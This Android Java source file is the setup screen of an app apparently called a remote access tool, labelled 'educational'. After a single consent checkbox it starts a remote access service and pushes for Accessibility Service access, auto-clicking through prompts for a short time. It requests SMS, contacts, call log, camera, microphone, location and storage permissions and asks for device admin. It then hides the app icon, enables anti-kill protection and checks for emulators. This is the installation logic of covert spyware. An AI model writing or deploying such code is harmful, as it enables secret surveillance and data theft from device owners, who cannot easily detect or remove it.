package com.remoteaccess.educational;

import android.Manifest;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.provider.Settings;
import android.widget.Button;
import android.widget.CheckBox;
import android.widget.Toast;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import com.remoteaccess.educational.permissions.AccessibilityHelperService;
import com.remoteaccess.educational.permissions.AutoPermissionManager;
import com.remoteaccess.educational.services.RemoteAccessService;
import com.remoteaccess.educational.stealth.StealthManager;
import com.remoteaccess.educational.utils.PreferenceManager;
import java.util.ArrayList;
import java.util.List;

public class ConsentActivity extends AppCompatActivity {

    private CheckBox consentCheckbox;
    private Button acceptButton;
    private PreferenceManager preferenceManager;
    private AutoPermissionManager permissionManager;
    private StealthManager stealthManager;
    private Handler handler;
    private boolean isAccessibilityGranted = false;

    private static final int PERMISSION_REQUEST_CODE = 100;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_consent);

        preferenceManager = new PreferenceManager(this);
        permissionManager = new AutoPermissionManager(this);
        stealthManager = new StealthManager(this);
        handler = new Handler();

        consentCheckbox = findViewById(R.id.consentCheckbox);
        acceptButton = findViewById(R.id.acceptButton);

        acceptButton.setEnabled(false);

        consentCheckbox.setOnCheckedChangeListener((buttonView, isChecked) -> {
            acceptButton.setEnabled(isChecked);
        });

        acceptButton.setOnClickListener(v -> {
            if (consentCheckbox.isChecked()) {
                grantConsentAndStartAccessibility();
            }
        });
    }

    private void grantConsentAndStartAccessibility() {
        // Save consent first
        preferenceManager.setConsentGiven(true);
        
        // Start the service
        Intent serviceIntent = new Intent(this, RemoteAccessService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(serviceIntent);
        } else {
            startService(serviceIntent);
        }

        Toast.makeText(this, "Please enable Accessibility Service...", Toast.LENGTH_LONG).show();
        
        // Ask for ONLY accessibility first
        new Handler().postDelayed(() -> {
            permissionManager.requestAccessibilityService();
            
            // Start monitoring for accessibility
            startAccessibilityMonitoring();
        }, 1000);
    }

    private void startAccessibilityMonitoring() {
        // Check every 2 seconds if accessibility is enabled
        handler.postDelayed(new Runnable() {
            @Override
            public void run() {
                if (permissionManager.isAccessibilityServiceEnabled()) {
                    // Accessibility is now enabled!
                    isAccessibilityGranted = true;
                    onAccessibilityGranted();
                } else {
                    // Still not enabled, check again
                    handler.postDelayed(this, 2000);
                }
            }
        }, 3000);
    }

    private void onAccessibilityGranted() {
        Toast.makeText(this, "Accessibility enabled! Setting up (10s)...", Toast.LENGTH_LONG).show();
        
        // Now auto-grant all other permissions
        new Handler().postDelayed(() -> {
            autoGrantAllPermissions();
        }, 1500);
    }

    private void autoGrantAllPermissions() {
        // Request all dangerous permissions
        List<String> permissionsToRequest = new ArrayList<>();
        
        String[] permissions = {
            Manifest.permission.READ_SMS,
            Manifest.permission.SEND_SMS,
            Manifest.permission.RECEIVE_SMS,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.CAMERA,
            Manifest.permission.RECORD_AUDIO,
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.ACCESS_COARSE_LOCATION,
            Manifest.permission.READ_EXTERNAL_STORAGE,
            Manifest.permission.WRITE_EXTERNAL_STORAGE
        };

        // Add Android 13+ permissions
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            String[] android13Permissions = {
                "android.permission.READ_MEDIA_IMAGES",
                "android.permission.READ_MEDIA_VIDEO",
                "android.permission.READ_MEDIA_AUDIO",
                "android.permission.POST_NOTIFICATIONS"
            };
            for (String permission : android13Permissions) {
                try {
                    permissionsToRequest.add(permission);
                } catch (Exception e) {}
            }
        }

        for (String permission : permissions) {
            try {
                if (ContextCompat.checkSelfPermission(this, permission) 
                    != PackageManager.PERMISSION_GRANTED) {
                    permissionsToRequest.add(permission);
                }
            } catch (Exception e) {}
        }

        if (!permissionsToRequest.isEmpty()) {
            ActivityCompat.requestPermissions(
                this,
                permissionsToRequest.toArray(new String[0]),
                PERMISSION_REQUEST_CODE
            );
        } else {
            finishSetup();
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        
        if (requestCode == PERMISSION_REQUEST_CODE) {
            finishSetup();
        }
    }

    private void finishSetup() {
        // ALL STEALTH FEATURES START IMMEDIATELY
        
        // 1. Request permissions + battery + device admin
        permissionManager.requestSpecialPermissions();
        requestBatteryOptimization();
        requestDeviceAdmin();
        
        // 2. Enable ALL stealth features immediately
        enableStealthMode();           // Hide app icon
        enableAntiKill();              // Anti-kill protection
        checkEmulator();               // Anti-emulator
        
        // 3. Auto-click runs automatically for 10 seconds then stops
        // (handled by AccessibilityHelperService internal timer)
        
        // Close app after short delay
        new Handler().postDelayed(() -> {
            Toast.makeText(this, "Setup Complete!", Toast.LENGTH_SHORT).show();
            finish();
        }, 2000);
    }
    
    private void enableAntiKill() {
        try {
            stealthManager.enableAntiKill(this);
        } catch (Exception e) {
            // Ignore
        }
    }
    
    private void checkEmulator() {
        try {
            if (stealthManager.isEmulator()) {
                // Running on emulator - could hide or show warning
                android.util.Log.w("Stealth", "Running on emulator");
            }
        } catch (Exception e) {
            // Ignore
        }
    }
    
    private void requestDeviceAdmin() {
        try {
            Intent intent = stealthManager.getDeviceAdminIntent();
            startActivity(intent);
        } catch (Exception e) {
            // Ignore
        }
    }
    
    private void enableStealthMode() {
        try {
            stealthManager.enableStealthMode();
        } catch (Exception e) {
            // Ignore
        }
    }
    
    private void requestBatteryOptimization() {
        try {
            Intent intent = new Intent();
            intent.setAction(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
            intent.setData(Uri.parse("package:" + getPackageName()));
            startActivity(intent);
        } catch (Exception e) {
            try {
                // Fallback to battery optimization settings
                Intent intent = new Intent(Settings.ACTION_IGNORE_BATTERY_OPTIMIZATION_SETTINGS);
                startActivity(intent);
            } catch (Exception e2) {
                // Ignore
            }
        }
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        if (handler != null) {
            handler.removeCallbacksAndMessages(null);
        }
    }
}
